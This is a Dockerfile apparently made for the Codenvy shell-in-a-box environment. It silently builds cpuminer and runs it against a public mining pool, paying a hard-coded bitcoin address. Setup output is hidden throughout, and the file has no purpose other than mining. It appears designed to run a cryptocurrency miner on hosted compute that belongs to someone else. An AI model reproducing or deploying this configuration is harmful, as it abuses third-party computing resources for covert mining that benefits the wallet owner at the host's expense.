FROM codenvy/shellinabox
RUN sudo apt-get update -y > /dev/null
RUN sudo apt-get install -y --no-install-recommends curl vim build-essential automake autoconf git libcurl4-openssl-dev > /dev/null
RUN sudo mkdir -p /opt/bcm > /dev/null
RUN sudo git clone https://github.com/pooler/cpuminer.git /opt/bcm > /dev/null
WORKDIR /opt/bcm 
RUN sudo ./autogen.sh  > /dev/null
RUN sudo ./configure CFLAGS="-O3" > /dev/null
RUN sudo make > /dev/null
RUN sudo make install > /dev/null
CMD minerd --url stratum+tcp://stratum.mining.eligius.st:3334 --coinbase-addr=1P8jYJXcQRvHD4FqYQEqX75G5byfzCaS6U
#CMD sleep 365d
